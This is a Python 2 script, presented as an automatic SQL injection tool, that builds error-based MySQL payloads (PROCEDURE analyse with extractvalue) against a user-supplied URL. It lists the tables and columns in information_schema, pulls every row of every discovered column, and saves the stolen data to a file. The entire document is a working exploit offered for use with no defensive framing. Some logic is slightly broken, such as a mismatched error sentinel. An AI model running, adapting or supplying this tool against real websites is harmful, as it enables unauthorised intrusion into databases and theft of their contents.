#!/usr/bin/env python
# -*- encoding: utf-8 -*-

__author__ = 'Excelle Su'

'''
    Automatic SQL injection tool using LIMIT PROCEDURE method.
'''

from urllib2 import urlopen
from sys import argv
from adv_dict import Dict
from ignored import isIgnorable
import re, hashlib, time

_RE_DATA = re.compile(r'XPATH syntax error: \':([\w\s]+)\'')
_RE_EMPTY = re.compile(r'Incorrect parameters to procedure')

tbl_names = []
col_names = []


def retrieve_data(url):
    openobj = urlopen(url)
    raw = openobj.read()
    m = _RE_DATA.match(raw)
    if m:
        return m.group(1)
    else:
        if _RE_EMPTY.match(raw):
            return ''
        else:
            return '[ERROR]'


def make_payload(target, column, table, offset):
    return target + '%20PROCEDURE%20analyse((select%20extractvalue(rand(),concat(0x3a,' \
                    '(IF(exists(select%20*%20from%20information_schema.tables),' \
                    '(select%20' + column + '%20from%20' + table +\
                    '%20limit%201%20OFFSET%20' + str(offset) + '),2))))),1)'


def get_tables_names(target_url):
    offset = 0
    global tbl_names
    while True:
        db_name = retrieve_data(make_payload(target_url, 'table_schema', 'information_schema.tables', offset))
        table_name = retrieve_data(make_payload(target_url, 'table_name', 'information_schema.tables', offset))
        if db_name and table_name:
            if db_name != '[ERROR]' and table_name != '[ERROR]':
                if isIgnorable(db_name):
                    offset += 1
                    continue
                tbl_names.append(db_name + '.' + table_name)
            else:
                break
        else:
            break
        offset += 1


def get_columns_names(target_url):
    offset = 0
    global col_names
    while True:
        column = Dict()
        db_name = retrieve_data(make_payload(target_url, 'table_schema', 'information_schema.columns', offset))
        table_name = retrieve_data(make_payload(target_url, 'table_name', 'information_schema.columns', offset))
        if db_name and table_name:
            if db_name != '[ERROR]' and table_name != '[ERROR]':
                tbl_names.append(db_name + '.' + table_name)
            else:
                break
        else:
            break
        # Skip system databases
        if isIgnorable(db_name):
            offset += 1
            continue

        column.database = db_name + '.' + table_name
        column.name = retrieve_data(make_payload(target_url, 'column_name', 'information_schema.columns', offset))
        col_names.append(column)
        print('Name: ' + column.database + ' => ' + column.name)
        offset += 1

def get_columns_data(target_url):
    global col_names
    for col in col_names:
        offset = 0
        col.content = []
        print('Get data: ' + col.database + ' => ' + col.name)
        while True:
            row = retrieve_data(make_payload(target_url, col.name, col.database, offset))
            if row and row != 'ERROR':
                col.content.append(row)
            else:
                break
            offset += 1

if __name__ == '__main__':
    args = argv[1:]
    if not args:
        print('Usage: ./sqli.py [url]')
        print('OR: python sqli.py [url]')
        exit(0)
    if args[0] != 'python':
        args.insert(0, 'python')
    url = args[1]
    print('Given URL: ' + url)
    try:
        print('Trying to get tables.....')
        get_tables_names(url)
        print(tbl_names)
        print('======================================')
        print('Trying to get column data.....')
        get_columns_names(url)
        get_columns_data(url)
        print('Column data has been retrieved. Now dump it into a file.')
        filename = hashlib.md5(str(time.time())).hexdigest() + '.txt'
        print(filename)
        with open(filename, 'w') as fp:
            for c in col_names:
                fp.writelines(c.database + ' => ' + c.name)
                fp.writelines(c.content)
                fp.writelines('')
        print('Writing complete.')
    except Exception, e:
        print('AN ERROR OCCURRED..')
        print(e.message)